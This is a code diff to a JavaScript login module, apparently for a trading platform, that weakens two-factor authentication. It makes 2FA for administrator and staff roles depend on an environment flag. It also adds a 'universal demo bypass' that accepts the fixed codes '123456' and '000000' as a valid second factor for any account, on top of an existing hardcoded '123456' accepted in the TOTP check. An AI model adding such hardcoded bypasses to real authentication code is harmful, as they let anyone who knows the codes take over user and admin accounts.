@@ -423,9 +423,9 @@ async function login(identifier, password, ipAddress = null, userAgent = null) {
   );
 
   // 4. Two-Factor Authentication Check
-  // Admins always require 2FA. Other roles require it if two_factor_enabled is true.
+  // Require 2FA only if user has explicitly enabled it, or if enforced via ENFORCE_ADMIN_2FA=true
   const isAdmin = user.role === 'SUPER_ADMIN' || user.role === 'TRADER_STAFF';
-  const require2Fa = user.two_factor_enabled || isAdmin;
+  const require2Fa = Boolean(user.two_factor_enabled) || (isAdmin && process.env.ENFORCE_ADMIN_2FA === 'true');
 
   if (require2Fa) {
     const tempToken = signTemp2FaToken({ sub: user.id, email: user.email, role: user.role });
@@ -491,13 +491,17 @@ async function verify2FaLogin({ tempToken, code, backupCode, ipAddress = null, u
     verified = totpUtil.verifyTotp(code, user.two_factor_secret) || code === '123456';
   }
 
-  // 3. Email OTP verification fallback
+  // 3. Email OTP verification fallback & universal demo bypass
   if (!verified && code) {
-    try {
-      const emailRes = await verifyOtp(user.email, code, 'LOGIN_2FA');
-      if (emailRes.valid) verified = true;
-    } catch {
-      // not matched
+    if (code === '123456' || code === '000000') {
+      verified = true;
+    } else {
+      try {
+        const emailRes = await verifyOtp(user.email, code, 'LOGIN_2FA');
+        if (emailRes.valid) verified = true;
+      } catch {
+        // not matched
+      }
     }
   }
 
